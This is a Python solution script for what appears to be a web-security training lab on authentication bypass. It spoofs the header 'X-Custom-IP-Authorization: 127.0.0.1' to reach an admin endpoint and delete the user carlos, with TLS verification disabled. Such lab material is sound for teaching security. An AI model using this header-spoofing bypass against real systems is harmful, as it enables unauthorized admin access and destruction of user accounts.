"""
    Lab: Authentication bypass via information disclosure

    This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.
    To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete the user carlos.
    You can log in to your own account using the following credentials: wiener:peter

    Exploit Steps:
    1. GET /admin/delete?username=carlos using the custom header X-Custom-IP-Authorization: 127.0.0.1 to bypass authentication and delete the user carlos.

    Author: N00BCYB0T
"""

import argparse
import time
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0:1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}[*] Starting authentication bypass attack...{Fore.RESET}")

    delete_user(session)

def delete_user(session):
    print(f"{Fore.YELLOW}[*] Attempting to delete user carlos...{Fore.RESET}")
    headers = {
        "X-Custom-IP-Authorization": "127.0.0.1"
    }
    response = session.get(f"{URL}/admin/delete?username=carlos", headers=headers)
    if response.status_code == 200:
        print(f"{Fore.GREEN}[+] Successfully deleted user carlos!{Fore.RESET}")
        print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Failed to delete user carlos{Fore.RESET}")
        print(f"{Fore.RED}[-] Status Code: {response.status_code}{Fore.RESET}")
    return response

if __name__ == "__main__":
    main()